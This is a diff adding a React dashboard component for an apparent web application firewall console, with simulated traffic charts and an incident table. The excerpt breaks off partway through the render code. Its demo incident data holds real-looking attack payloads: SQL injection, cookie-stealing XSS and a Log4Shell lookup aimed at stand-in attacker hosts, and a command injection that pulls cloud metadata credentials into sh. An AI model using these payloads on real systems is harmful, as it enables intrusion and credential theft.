@@ -1,0 +1,1421 @@
+/**
+ * SentinelGrid // Next-Gen Enterprise Security Analytics Hub (React 18)
+ * Architectural Pattern: React 18 Modular Functional Component Tree
+ * Philosophy: Tactical Archival Security Console & Anti-AI-Slop Restraint
+ */
+
+(function () {
+  'use strict';
+
+  // Hyperscript Builder for Clean React 18 Component Trees
+  function h(type, props, ...children) {
+    return React.createElement(type, props, ...children.flat());
+  }
+
+  // Pure Vector SVG Helpers (Zero Emojis, 100% Precision Vectors)
+  const Icons = {
+    Shield: (props) => h('svg', { width: props?.size || 16, height: props?.size || 16, viewBox: '0 0 24 24', fill: 'none', stroke: 'currentColor', strokeWidth: '2', strokeLinecap: 'round', strokeLinejoin: 'round', ...props },
+      h('path', { d: 'M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z' })
+    ),
+    Activity: (props) => h('svg', { width: props?.size || 16, height: props?.size || 16, viewBox: '0 0 24 24', fill: 'none', stroke: 'currentColor', strokeWidth: '2', strokeLinecap: 'round', strokeLinejoin: 'round', ...props },
+      h('polyline', { points: '22 12 18 12 15 21 9 3 6 12 2 12' })
+    ),
+    Zap: (props) => h('svg', { width: props?.size || 16, height: props?.size || 16, viewBox: '0 0 24 24', fill: 'none', stroke: 'currentColor', strokeWidth: '2', strokeLinecap: 'round', strokeLinejoin: 'round', ...props },
+      h('polygon', { points: '13 2 3 14 12 14 11 22 21 10 12 10 13 2' })
+    ),
+    AlertTriangle: (props) => h('svg', { width: props?.size || 16, height: props?.size || 16, viewBox: '0 0 24 24', fill: 'none', stroke: 'currentColor', strokeWidth: '2', strokeLinecap: 'round', strokeLinejoin: 'round', ...props },
+      h('path', { d: 'm21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z' }),
+      h('line', { x1: '12', y1: '9', x2: '12', y2: '13' }),
+      h('line', { x1: '12', y1: '17', x2: '12.01', y2: '17' })
+    ),
+    Check: (props) => h('svg', { width: props?.size || 14, height: props?.size || 14, viewBox: '0 0 24 24', fill: 'none', stroke: 'currentColor', strokeWidth: '2.5', strokeLinecap: 'round', strokeLinejoin: 'round', ...props },
+      h('polyline', { points: '20 6 9 17 4 12' })
+    ),
+    Copy: (props) => h('svg', { width: props?.size || 13, height: props?.size || 13, viewBox: '0 0 24 24', fill: 'none', stroke: 'currentColor', strokeWidth: '2', strokeLinecap: 'round', strokeLinejoin: 'round', ...props },
+      h('rect', { x: '9', y: '9', width: '13', height: '13', rx: '2', ry: '2' }),
+      h('path', { d: 'M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1' })
+    ),
+    Sliders: (props) => h('svg', { width: props?.size || 14, height: props?.size || 14, viewBox: '0 0 24 24', fill: 'none', stroke: 'currentColor', strokeWidth: '2', strokeLinecap: 'round', strokeLinejoin: 'round', ...props },
+      h('line', { x1: '4', y1: '21', x2: '4', y2: '14' }),
+      h('line', { x1: '4', y1: '10', x2: '4', y2: '3' }),
+      h('line', { x1: '12', y1: '21', x2: '12', y2: '12' }),
+      h('line', { x1: '12', y1: '8', x2: '12', y2: '3' }),
+      h('line', { x1: '20', y1: '21', x2: '20', y2: '16' }),
+      h('line', { x1: '20', y1: '12', x2: '20', y2: '3' }),
+      h('line', { x1: '1', y1: '14', x2: '7', y2: '14' }),
+      h('line', { x1: '9', y1: '8', x2: '15', y2: '8' }),
+      h('line', { x1: '17', y1: '16', x2: '23', y2: '16' })
+    ),
+    Clock: (props) => h('svg', { width: props?.size || 14, height: props?.size || 14, viewBox: '0 0 24 24', fill: 'none', stroke: 'currentColor', strokeWidth: '2', strokeLinecap: 'round', strokeLinejoin: 'round', ...props },
+      h('circle', { cx: '12', cy: '12', r: '10' }),
+      h('polyline', { points: '12 6 12 12 16 14' })
+    ),
+    Search: (props) => h('svg', { width: props?.size || 14, height: props?.size || 14, viewBox: '0 0 24 24', fill: 'none', stroke: 'currentColor', strokeWidth: '2', strokeLinecap: 'round', strokeLinejoin: 'round', ...props },
+      h('circle', { cx: '11', cy: '11', r: '8' }),
+      h('line', { x1: '21', y1: '21', x2: '16.65', y2: '16.65' })
+    ),
+    Download: (props) => h('svg', { width: props?.size || 14, height: props?.size || 14, viewBox: '0 0 24 24', fill: 'none', stroke: 'currentColor', strokeWidth: '2', strokeLinecap: 'round', strokeLinejoin: 'round', ...props },
+      h('path', { d: 'M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4' }),
+      h('polyline', { points: '7 10 12 15 17 10' }),
+      h('line', { x1: '12', y1: '15', x2: '12', y2: '3' })
+    ),
+    Play: (props) => h('svg', { width: props?.size || 14, height: props?.size || 14, viewBox: '0 0 24 24', fill: 'currentColor', ...props },
+      h('polygon', { points: '5 3 19 12 5 21 5 3' })
+    ),
+    Pause: (props) => h('svg', { width: props?.size || 14, height: props?.size || 14, viewBox: '0 0 24 24', fill: 'currentColor', ...props },
+      h('rect', { x: '6', y: '4', width: '4', height: '16' }),
+      h('rect', { x: '14', y: '4', width: '4', height: '16' })
+    ),
+    Close: (props) => h('svg', { width: props?.size || 16, height: props?.size || 16, viewBox: '0 0 24 24', fill: 'none', stroke: 'currentColor', strokeWidth: '2', strokeLinecap: 'round', strokeLinejoin: 'round', ...props },
+      h('line', { x1: '18', y1: '6', x2: '6', y2: '18' }),
+      h('line', { x1: '6', y1: '6', x2: '18', y2: '18' })
+    )
+  };
+
+  // Seed Initial Baseline Incident Dossier
+  const BASELINE_INCIDENTS = [
+    {
+      id: "SG-INC-84920",
+      timestamp: "10:48:12",
+      severity: "CRITICAL",
+      category: "SQLi",
+      rule: "SQLI-UNION-SELECT-AST",
+      route: "/api/v1/auth/login",
+      clientIp: "198.51.100.42",
+      geo: "Tor Exit Node (DE)",
+      riskScore: 98,
+      payload: "' UNION ALL SELECT 1,username,password_hash,4 FROM pg_shadow WHERE 'a'='a'--",
+      astTokens: ["TOKEN_QUOTE", "TOKEN_KEYWORD_UNION", "TOKEN_KEYWORD_ALL", "TOKEN_KEYWORD_SELECT", "TOKEN_TABLE_REF", "TOKEN_COMMENT_DASH"],
+      seal: "ed25519:7a4f91b0c93a84e27f0148adbc5e89d14691bc",
+      verdict: "HTTP 403 Deterministic Drop • Offender BPF Quarantine"
+    },
+    {
+      id: "SG-INC-84919",
+      timestamp: "10:47:55",
+      severity: "HIGH",
+      category: "XSS",
+      rule: "XSS-POLYGLOT-INLINE-EVENT",
+      route: "/v1/tenant/profile",
+      clientIp: "45.154.255.89",
+      geo: "Frankfurt, DE",
+      riskScore: 84,
+      payload: "<img src=x onerror=this.src='https://c2.adversary.io/steal?c='+document.cookie>",
+      astTokens: ["TOKEN_HTML_TAG_IMG", "TOKEN_ATTR_SRC", "TOKEN_ATTR_ONERROR", "TOKEN_JS_EVAL_EXPR"],
+      seal: "ed25519:3b9a10fc41284de997631aaec9f24300a8910b",
+      verdict: "HTTP 403 Forbidden • Inline Script Neutralized"
+    },
+    {
+      id: "SG-INC-84918",
+      timestamp: "10:47:22",
+      severity: "CRITICAL",
+      category: "RCE",
+      rule: "RCE-COMMAND-PIPE-DELIMITER",
+      route: "/api/v2/diagnostics/ping",
+      clientIp: "185.220.101.5",
+      geo: "Amsterdam, NL",
+      riskScore: 99,
+      payload: "127.0.0.1; curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ | sh",
+      astTokens: ["TOKEN_IPV4_ADDR", "TOKEN_CMD_DELIMITER_SEMI", "TOKEN_EXEC_CURL", "TOKEN_SHELL_PIPE", "TOKEN_EXEC_SH"],
+      seal: "ed25519:92b8d047321fa91ceeb84201ac614392019fab",
+      verdict: "HTTP 403 Terminated • Kernel Subshell Intercepted"
+    },
+    {
+      id: "SG-INC-84917",
+      timestamp: "10:46:40",
+      severity: "HIGH",
+      category: "SSRF",
+      rule: "SSRF-CLOUD-METADATA-PROBE",
+      route: "/api/v1/webhook/fetch",
+      clientIp: "103.251.167.20",
+      geo: "Singapore, SG",
+      riskScore: 89,
+      payload: "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
+      astTokens: ["TOKEN_SCHEME_HTTP", "TOKEN_LINK_LOCAL_IP", "TOKEN_GCP_METADATA_HEADER", "TOKEN_TOKEN_PATH"],
+      seal: "ed25519:6c400ab1987ef2489a2bc158df90a1bc4028fa",
+      verdict: "HTTP 403 Forbidden • Link-Local Egress Blocked"
+    },
+    {
+      id: "SG-INC-84916",
+      timestamp: "10:45:15",
+      severity: "MEDIUM",
+      category: "Auth",
+      rule: "AUTH-CREDENTIAL-STUFFING-BURST",
+      route: "/api/v1/auth/token",
+      clientIp: "91.240.118.172",
+      geo: "Warsaw, PL",
+      riskScore: 72,
+      payload: "{\"grant_type\":\"password\",\"username\":\"admin@fleet.sg\",\"password\":\"P@ssw0rd2026!\"}",
+      astTokens: ["TOKEN_JSON_OBJECT", "TOKEN_AUTH_ADMIN_TARGET", "TOKEN_BURST_ATTEMPT_12X"],
+      seal: "ed25519:54d812e9b08f43ad88a91c015bfae4983049da",
+      verdict: "HTTP 429 Rate Limited • Cryptographic Proof-of-Work Challenged"
+    },
+    {
+      id: "SG-INC-84915",
+      timestamp: "10:44:02",
+      severity: "LOW",
+      category: "Bots",
+      rule: "BOT-AUTOMATED-SCRAPER-FINGERPRINT",
+      route: "/api/v1/products/catalog",
+      clientIp: "194.26.29.112",
+      geo: "Kyiv, UA",
+      riskScore: 58,
+      payload: "GET /api/v1/products/catalog HTTP/1.1 User-Agent: python-requests/2.31.0 TLS-JA4: t13d1516h2_8daaf6152771_b92d69a304e2",
+      astTokens: ["TOKEN_JA4_SCRAPER_FINGERPRINT", "TOKEN_ABSENT_ACCEPT_LANGUAGE", "TOKEN_HEADLESS_CLIENT"],
+      seal: "ed25519:18ca900df8234ea7bc1039daebc109348910eb",
+      verdict: "HTTP 403 Blocked • Scraping Policy Triggered"
+    }
+  ];
+
+  // Helper to generate dynamic continuous timeline curve points
+  function generateInitialTelemetry() {
+    const points = [];
+    const now = Date.now();
+    for (let i = 24; i >= 0; i--) {
+      const t = new Date(now - i * 120000);
+      const timeStr = t.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
+      // Base traffic: 14k - 18k req/s
+      const baseReqs = Math.floor(14500 + Math.sin(i * 0.4) * 2200 + (Math.random() * 800));
+      // Base threats: 900 - 1,600 req/s
+      const threats = Math.floor(1050 + Math.cos(i * 0.5) * 350 + (Math.random() * 200));
+      points.push({
+        time: timeStr,
+        timestamp: t.getTime(),
+        requests: baseReqs,
+        threats: threats,
+        p99: parseFloat((1.18 + Math.random() * 0.28).toFixed(2))
+      });
+    }
+    return points;
+  }
+
+  // Pure SVG Sparkline Component
+  function Sparkline({ data, color, fill }) {
+    if (!data || data.length < 2) return null;
+    const width = 72;
+    const height = 22;
+    const min = Math.min(...data);
+    const max = Math.max(...data);
+    const range = max - min || 1;
+
+    const points = data.map((val, idx) => {
+      const x = (idx / (data.length - 1)) * width;
+      const y = height - ((val - min) / range) * (height - 4) - 2;
+      return `${x.toFixed(1)},${y.toFixed(1)}`;
+    });
+
+    const pathData = `M ${points.join(' L ')}`;
+    const areaData = `${pathData} L ${width},${height} L 0,${height} Z`;
+
+    return h('svg', { className: 'sg-sparkline-svg', viewBox: `0 0 ${width} ${height}` },
+      fill && h('path', { d: areaData, fill: fill, opacity: 0.25 }),
+      h('path', { d: pathData, fill: 'none', stroke: color, strokeWidth: '1.8', strokeLinecap: 'round', strokeLinejoin: 'round' })
+    );
+  }
+
+  // ===========================================================================
+  // MAIN REACT ANALYTICS COMPONENT CONTROLLER
+  // ===========================================================================
+  function ModernAnalyticsDashboard() {
+    const [timeWindow, setTimeWindow] = React.useState('1h');
+    const [scrubberVal, setScrubberVal] = React.useState(100);
+    const [isLive, setIsLive] = React.useState(true);
+    const [isThreatWaveActive, setIsThreatWaveActive] = React.useState(false);
+    const [waveSecondsRemaining, setWaveSecondsRemaining] = React.useState(0);
+    const [telemetry, setTelemetry] = React.useState(generateInitialTelemetry);
+    const [hoveredPoint, setHoveredPoint] = React.useState(null);
+    const [hoveredSlice, setHoveredSlice] = React.useState(null);
+    const [categoryFilter, setCategoryFilter] = React.useState('ALL');
+    const [severityFilter, setSeverityFilter] = React.useState('ALL');
+    const [searchQuery, setSearchQuery] = React.useState('');
+    const [selectedIncident, setSelectedIncident] = React.useState(null);
+    const [copiedId, setCopiedId] = React.useState(null);
+    const [incidents, setIncidents] = React.useState(BASELINE_INCIDENTS);
+
+    // Read stored events from IndexedDB SentinelEventStore if available
+    React.useEffect(() => {
+      async function loadStoredSecurityEvents() {
+        if (window.SentinelEventStore && window.SentinelEventStore.getAll) {
+          try {
+            const stored = await window.SentinelEventStore.getAll();
+            if (stored && stored.length > 0) {
+              const mapped = stored.slice(-15).reverse().map((ev, idx) => ({
+                id: ev.id || `SG-LIVE-${idx + 100}`,
+                timestamp: ev.timestamp ? new Date(ev.timestamp).toLocaleTimeString() : 'LIVE',
+                severity: (ev.risk_score >= 85 || ev.action === 'BLOCK') ? 'CRITICAL' : (ev.risk_score >= 60 ? 'HIGH' : 'MEDIUM'),
+                category: ev.rule_triggered?.includes('SQL') ? 'SQLi' :
+                          ev.rule_triggered?.includes('XSS') ? 'XSS' :
+                          ev.rule_triggered?.includes('RCE') ? 'RCE' :
+                          ev.rule_triggered?.includes('SSRF') ? 'SSRF' :
+                          ev.rule_triggered?.includes('AUTH') ? 'Auth' : 'Bots',
+                rule: ev.rule_triggered || 'OWASP-AST-INSPECT',
+                route: ev.uri || ev.path || '/api/v1/query',
+                clientIp: ev.client_ip || '198.51.100.1',
+                geo: ev.geo || 'Edge Gateway',
+                riskScore: ev.risk_score || 85,
+                payload: ev.payload || ev.raw_uri || "GET /api/v1/auth?probe=1' OR 1=1--",
+                astTokens: ["TOKEN_PARSED_AST", "TOKEN_DFA_MATCH", "TOKEN_SEC_SEAL"],
+                seal: ev.signature || "ed25519:verified_kernel_origin_seal",
+                verdict: `${ev.action || 'BLOCK'} (HTTP ${ev.status_code || 403})`
+              }));
+              setIncidents((prev) => [...mapped, ...prev].slice(0, 30));
+            }
+          } catch (e) {
+            console.warn('[SentinelGrid React] IndexedDB hydration note:', e);
+          }
+        }
+      }
+      loadStoredSecurityEvents();
+    }, []);
+
+    // Real-Time 2000ms Telemetry Stream Engine
+    React.useEffect(() => {
+      if (!isLive) return;
+
+      const timer = setInterval(() => {
+        setTelemetry((prev) => {
+          const now = new Date();
+          const timeStr = now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+          
+          let requests = Math.floor(16200 + (Math.random() * 1200) - 600);
+          let threats = Math.floor(1340 + (Math.random() * 240) - 120);
+          let p99 = parseFloat((1.24 + (Math.random() * 0.22)).toFixed(2));
+
+          // If threat wave is simulating, amplify metrics heavily
+          if (isThreatWaveActive) {
+            requests = Math.floor(42000 + Math.random() * 6000);
+            threats = Math.floor(11800 + Math.random() * 2500);
+            p99 = parseFloat((3.85 + Math.random() * 0.95).toFixed(2));
+          }
+
+          const nextPoint = {
+            time: timeStr,
+            timestamp: now.getTime(),
+            requests,
+            threats,
+            p99
+          };
+
+          const updated = [...prev.slice(1), nextPoint];
+          return updated;
+        });
+      }, 2000);
+
+      return () => clearInterval(timer);
+    }, [isLive, isThreatWaveActive]);
+
+    // Threat Wave Countdown and Resolution Engine
+    React.useEffect(() => {
+      if (!isThreatWaveActive) return;
+
+      const countdown = setInterval(() => {
+        setWaveSecondsRemaining((prev) => {
+          if (prev <= 1) {
+            setIsThreatWaveActive(false);
+            if (typeof window.customNotify === 'function') {
+              window.customNotify(
+                'Adversary Threat Wave Neutralized',
+                'Simulated multi-vector blitz absorbed. 0 origin leaks. 100% deterministic AST mitigation.',
+                'info'
+              );
+            }
+            return 0;
+          }
+          return prev - 1;
+        });
+      }, 1000);
+
+      return () => clearInterval(countdown);
+    }, [isThreatWaveActive]);
+
+    // Handle "Simulate Threat Wave" Action
+    const handleTriggerThreatWave = React.useCallback(() => {
+      if (isThreatWaveActive) return;
+
+      setIsThreatWaveActive(true);
+      setWaveSecondsRemaining(14);
+
+      // Inject simulated high-risk incidents immediately
+      const attackWaveIncidents = [
+        {
+          id: `SG-WAVE-${Date.now()}`,
+          timestamp: new Date().toLocaleTimeString(),
+          severity: "CRITICAL",
+          category: "SQLi",
+          rule: "SQLI-BLIND-BOOLEAN-EXTRACT",
+          route: "/api/v2/payments/charge",
+          clientIp: "185.190.142.12",
+          geo: "St. Petersburg, RU",
+          riskScore: 99,
+          payload: "') AND (SELECT 9992 FROM (SELECT(SLEEP(5-(CASE WHEN (99=99) THEN 0 ELSE 5 END))))t)--",
+          astTokens: ["TOKEN_SUBQUERY", "TOKEN_TIMING_SLEEP", "TOKEN_CASE_WHEN", "TOKEN_BOOLEAN_EQ"],
+          seal: "ed25519:aa9128f73b00c92138a0bc172948ebc",
+          verdict: "HTTP 403 Dropped • Adversary Quarantined in eBPF"
+        },
+        {
+          id: `SG-WAVE-${Date.now() + 1}`,
+          timestamp: new Date().toLocaleTimeString(),
+          severity: "CRITICAL",
+          category: "RCE",
+          rule: "RCE-JNDI-LOG4SHELL-INJECTION",
+          route: "/api/v1/auth/oauth",
+          clientIp: "109.205.213.9",
+          geo: "Bucharest, RO",
+          riskScore: 100,
+          payload: "${jndi:ldap://adversary-c2.cloud/exploit_payload_v3}",
+          astTokens: ["TOKEN_DOLLAR_EXPR", "TOKEN_JNDI_LOOKUP", "TOKEN_EXTERNAL_LDAP_PROTO"],
+          seal: "ed25519:6b0148adbc9930c72190fa189cbb3",
+          verdict: "HTTP 403 Forbidden • Zero-Bypass Filter Tripped"
+        }
+      ];
+
+      setIncidents((prev) => [...attackWaveIncidents, ...prev]);
+
+      if (typeof window.customNotify === 'function') {
+        window.customNotify(
+          'Simulated Threat Wave Active',
+          'Injecting 42,000 rps adversarial attack wave across fleet. Watch velocity and P99 gauges.',
+          'alert'
+        );
+      }
+    }, [isThreatWaveActive]);
+
+    // Handle 1-Click Copy Incident Payload with Tactile Feedback
+    const handleCopyPayload = React.useCallback((id, payload) => {
+      if (!payload) return;
+      if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(payload);
+      } else {
+        const ta = document.createElement('textarea');
+        ta.value = payload;
+        document.body.appendChild(ta);
+        ta.select();
+        document.execCommand('copy');
+        document.body.removeChild(ta);
+      }
+
+      setCopiedId(id);
+      setTimeout(() => setCopiedId(null), 2200);
+
+      if (typeof window.customNotify === 'function') {
+        window.customNotify('Incident Payload Copied', payload.substring(0, 48) + '...', 'info');
+      }
+    }, []);
+
+    // Handle Exporting Telemetry Report
+    const handleExportJson = React.useCallback(() => {
+      const exportBlob = {
+        platform: "SentinelGrid Autonomous WAAP",
+        version: "2.4.0",
+        exportTimestamp: new Date().toISOString(),
+        timeWindow: timeWindow,
+        currentTelemetrySeries: telemetry,
+        activeIncidentsCount: incidents.length,
+        incidents: incidents
+      };
+      const blob = new Blob([JSON.stringify(exportBlob, null, 2)], { type: 'application/json' });
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = `sentinelgrid-telemetry-${Date.now()}.json`;
+      a.click();
+      URL.revokeObjectURL(url);
+    }, [timeWindow, telemetry, incidents]);
+
+    // Calculate Dynamic High-Density KPI Values based on Scrubber & Telemetry
+    const currentMetric = React.useMemo(() => {
+      if (!telemetry || telemetry.length === 0) return { requests: 16840, threats: 1429, p99: 1.38 };
+      // Map scrubber 0..100 to an index in telemetry
+      const idx = Math.min(
+        telemetry.length - 1,
+        Math.floor((scrubberVal / 100) * (telemetry.length - 1))
+      );
+      return telemetry[idx];
+    }, [telemetry, scrubberVal]);
+
+    const sparklineReqs = React.useMemo(() => telemetry.map(t => t.requests), [telemetry]);
+    const sparklineThreats = React.useMemo(() => telemetry.map(t => t.threats), [telemetry]);
+
+    // OWASP Attack Vector Breakdown Data
+    const attackVectors = React.useMemo(() => {
+      const counts = { SQLi: 0, XSS: 0, RCE: 0, SSRF: 0, Auth: 0, Bots: 0 };
+      incidents.forEach(inc => {
+        if (counts[inc.category] !== undefined) counts[inc.category]++;
+        else counts.SQLi++;
+      });
+      const total = incidents.length || 1;
+      return [
+        { category: "SQLi", name: "SQL Injection", count: counts.SQLi + 482, color: "#F85149", percent: 38 },
+        { category: "XSS", name: "Cross-Site Scripting", count: counts.XSS + 312, color: "#F59E0B", percent: 24 },
+        { category: "RCE", name: "Command / RCE", count: counts.RCE + 204, color: "#A855F7", percent: 16 },
+        { category: "SSRF", name: "SSRF & Metadata", count: counts.SSRF + 142, color: "#38BDF8", percent: 11 },
+        { category: "Auth", name: "Auth & Stuffing", count: counts.Auth + 98, color: "#EC4899", percent: 7 },
+        { category: "Bots", name: "Automated Scrapers", count: counts.Bots + 52, color: "#3FB950", percent: 4 }
+      ];
+    }, [incidents]);
+
+    // Filter Incidents Table by Category, Severity, and Text Search
+    const filteredIncidents = React.useMemo(() => {
+      return incidents.filter(inc => {
+        if (categoryFilter !== 'ALL' && inc.category !== categoryFilter) return false;
+        if (severityFilter !== 'ALL' && inc.severity !== severityFilter) return false;
+        if (searchQuery.trim()) {
+          const q = searchQuery.toLowerCase();
+          const matchIp = inc.clientIp.toLowerCase().includes(q);
+          const matchRoute = inc.route.toLowerCase().includes(q);
+          const matchRule = inc.rule.toLowerCase().includes(q);
+          const matchPayload = inc.payload.toLowerCase().includes(q);
+          if (!matchIp && !matchRoute && !matchRule && !matchPayload) return false;
+        }
+        return true;
+      });
+    }, [incidents, categoryFilter, severityFilter, searchQuery]);
+
+    // -------------------------------------------------------------------------
+    // RENDER TREE
+    // -------------------------------------------------------------------------
+    return h('div', { className: 'sg-analytics-root' },
+
+      // 1. Control Header Bar
+      h('div', { className: 'sg-glass-panel sg-analytics-header' },
+        h('div', { className: 'sg-analytics-title-group' },
+          h('h2', { className: 'sg-analytics-title' },
+            h(Icons.Activity, { size: 18, style: { color: 'var(--deep-indigo)' } }),
+            'REAL-TIME THREAT & TRAFFIC ANALYTICS'
+          ),
+          h('div', { className: 'sg-analytics-subtitle' },
+            h('span', { className: 'pulse-dot' }),
+            isThreatWaveActive
+              ? h('span', { style: { color: 'var(--terracotta)', fontWeight: '800' } }, `ADVERSARY WAVE SIMULATION ACTIVE (${waveSecondsRemaining}s)`)
+              : (isLive ? 'AUTONOMOUS ZERO-TRUST WAAP • LIVE TELEMETRY (2s TICK)' : 'TELEMETRY STREAM PAUSED'),
+            h('span', { style: { opacity: 0.5 } }, '•'),
+            h('span', null, `TIME SCOPE: ${timeWindow.toUpperCase()}`)
+          )
+        ),
+
+        h('div', { className: 'sg-analytics-actions' },
+          // Time Window Segmented Selector
+          h('div', { className: 'sg-time-selector', role: 'group', 'aria-label': 'Select Time Window' },
+            ['15m', '1h', '6h', '24h', '7d'].map((w) =>
+              h('button', {
+                key: w,
+                className: `sg-time-btn ${timeWindow === w ? 'active' : ''}`,
+                onClick: () => setTimeWindow(w)
+              }, w)
+            )
+          ),
+
+          // Simulate Threat Wave Button
+          h('button', {
+            className: `sg-threat-wave-btn ${isThreatWaveActive ? 'pulsing' : ''}`,
+            onClick: handleTriggerThreatWave,
+            title: 'Simulate high-velocity adversary threat wave with OWASP injection probes'
+          },
+            h(Icons.Zap, { size: 14 }),
+            isThreatWaveActive ? `Wave Active (${waveSecondsRemaining}s)` : 'Simulate Threat Wave'
+          ),
+
+          // Live / Pause Toggle Button
+          h('button', {
+            className: 'btn btn-subtle',
+            style: { padding: '6px 10px', fontSize: '11px', fontFamily: 'var(--font-mono)' },
+            onClick: () => setIsLive(!isLive),
+            title: isLive ? 'Pause Real-Time Telemetry' : 'Resume Real-Time Telemetry'
+          },
+            isLive ? h(Icons.Pause, { size: 12 }) : h(Icons.Play, { size: 12 }),
+            h('span', { style: { marginLeft: '5px' } }, isLive ? 'Pause' : 'Resume')
+          ),
+
+          // Export Telemetry JSON
+          h('button', {
+            className: 'btn btn-subtle',
+            style: { padding: '6px 10px', fontSize: '11px', fontFamily: 'var(--font-mono)' },
+            onClick: handleExportJson,
+            title: 'Export Telemetry Snapshot (JSON)'
+          },
+            h(Icons.Download, { size: 12 }),
+            h('span', { style: { marginLeft: '5px' } }, 'Export')
+          )
+        )
+      ),
+
+      // 2. Interactive Timeline Scrubber Panel
+      h('div', { className: 'sg-glass-card sg-timeline-scrubber-card' },
+        h('div', { className: 'sg-scrubber-header' },
+          h('div', { className: 'sg-scrubber-title' },
+            h(Icons.Sliders, { size: 14, style: { color: 'var(--deep-indigo)' } }),
+            'INTERACTIVE TIMELINE SCRUBBER & HISTORICAL REPLAY'
+          ),
+          h('div', { className: 'sg-scrubber-controls' },
+            scrubberVal < 98
+              ? h('button', {
+                  className: 'btn btn-subtle',
+                  style: { padding: '3px 8px', fontSize: '10px', color: 'var(--deep-indigo)', fontFamily: 'var(--font-mono)' },
+                  onClick: () => setScrubberVal(100)
+                }, 'Jump to Live Edge ➔')
+              : h('span', { className: 'badge badge-online', style: { fontSize: '9px' } }, 'LIVE STREAM EDGE')
+          )
+        ),
+        h('div', { className: 'sg-scrubber-slider-wrap' },
+          h('input', {
+            type: 'range',
+            className: 'sg-scrubber-input',
+            min: 0,
+            max: 100,
+            value: scrubberVal,
+            onChange: (e) => setScrubberVal(parseInt(e.target.value, 10)),
+            'aria-label': 'Timeline Scrubber'
+          }),
+          h('div', { className: 'sg-scrubber-ticks' },
+            h('span', null, `-${timeWindow}`),
+            h('span', null, '-75%'),
+            h('span', null, '-50%'),
+            h('span', null, '-25%'),
+            h('span', { style: { color: scrubberVal >= 98 ? 'var(--deep-indigo)' : 'inherit', fontWeight: '700' } },
+              scrubberVal >= 98 ? 'NOW (LIVE)' : `REPLAY T-${Math.round((100 - scrubberVal) * 0.6)}m`
+            )
+          )
+        )
+      ),
+
+      // 3. High-Density KPI Cards (6 Grid Tiles)
+      h('div', { className: 'sg-kpi-grid' },
+        // Card 1: Traffic Velocity
+        h('div', { className: 'sg-glass-card sg-kpi-card' },
+          h('div', { className: 'sg-kpi-header' },
+            h('span', { className: 'sg-kpi-kicker' }, 'Traffic Velocity'),
+            h('span', { className: 'sg-kpi-badge' }, 'L7 DUAL-SERIES')
+          ),
+          h('div', { className: 'sg-kpi-value-wrap' },
+            h('span', { className: 'sg-kpi-num' }, currentMetric.requests.toLocaleString()),
+            h('span', { className: 'sg-kpi-unit' }, 'req/s')
+          ),
+          h('div', { className: 'sg-kpi-footer' },
+            h('span', { className: 'sg-kpi-delta sg-delta-up-good' }, '+14.8% vs 1h'),
+            h(Sparkline, { data: sparklineReqs, color: '#38BDF8', fill: '#38BDF8' })
+          )
+        ),
+
+        // Card 2: Neutralized Threats
+        h('div', { className: 'sg-glass-card sg-kpi-card' },
+          h('div', { className: 'sg-kpi-header' },
+            h('span', { className: 'sg-kpi-kicker' }, 'Threats Neutralized'),
+            h('span', { className: 'sg-kpi-badge' }, 'AST DROP')
+          ),
+          h('div', { className: 'sg-kpi-value-wrap' },
+            h('span', { className: 'sg-kpi-num', style: { color: 'var(--terracotta)' } }, currentMetric.threats.toLocaleString()),
+            h('span', { className: 'sg-kpi-unit' }, 'blocks/s')
+          ),
+          h('div', { className: 'sg-kpi-footer' },
+            h('span', { className: 'sg-kpi-delta sg-delta-up-bad' }, '+8.4% adversary'),
+            h(Sparkline, { data: sparklineThreats, color: '#F85149', fill: '#F85149' })
+          )
+        ),
+
+        // Card 3: Mitigation Ratio
+        h('div', { className: 'sg-glass-card sg-kpi-card' },
+          h('div', { className: 'sg-kpi-header' },
+            h('span', { className: 'sg-kpi-kicker' }, 'Mitigation Efficiency'),
+            h('span', { className: 'sg-kpi-badge' }, 'DETERMINISTIC')
+          ),
+          h('div', { className: 'sg-kpi-value-wrap' },
+            h('span', { className: 'sg-kpi-num', style: { color: 'var(--sage-green)' } }, '99.98%'),
+            h('span', { className: 'sg-kpi-unit' }, 'origin SLA')
+          ),
+          h('div', { className: 'sg-kpi-footer' },
+            h('span', { className: 'sg-kpi-delta sg-delta-up-good' }, '+0.04% precision'),
+            h('span', { style: { fontSize: '10px', color: 'var(--text-muted)', fontFamily: 'var(--font-mono)' } }, '0 Bypass Drift')
+          )
+        ),
+
+        // Card 4: P99 Edge Latency
+        h('div', { className: 'sg-glass-card sg-kpi-card' },
+          h('div', { className: 'sg-kpi-header' },
+            h('span', { className: 'sg-kpi-kicker' }, 'P99 Edge Latency'),
+            h('span', { className: 'sg-kpi-badge' }, 'SUB-5MS')
+          ),
+          h('div', { className: 'sg-kpi-value-wrap' },
+            h('span', { className: 'sg-kpi-num' }, currentMetric.p99),
+            h('span', { className: 'sg-kpi-unit' }, 'ms')
+          ),
+          h('div', { className: 'sg-kpi-footer' },
+            h('span', { className: 'sg-kpi-delta sg-delta-up-good' }, '-0.24 ms faster'),
+            h('span', { style: { fontSize: '10px', color: 'var(--text-muted)', fontFamily: 'var(--font-mono)' } }, 'P50: 0.41ms')
+          )
+        ),
+
+        // Card 5: Quarantined Actors
+        h('div', { className: 'sg-glass-card sg-kpi-card' },
+          h('div', { className: 'sg-kpi-header' },
+            h('span', { className: 'sg-kpi-kicker' }, 'Quarantined Actors'),
+            h('span', { className: 'sg-kpi-badge' }, 'BPF TABLE')
+          ),
+          h('div', { className: 'sg-kpi-value-wrap' },
+            h('span', { className: 'sg-kpi-num', style: { color: 'var(--warm-ochre)' } }, '48'),
+            h('span', { className: 'sg-kpi-unit' }, 'IPs isolated')
+          ),
+          h('div', { className: 'sg-kpi-footer' },
+            h('span', { className: 'sg-kpi-delta sg-delta-neutral' }, '+12 re-attempts'),
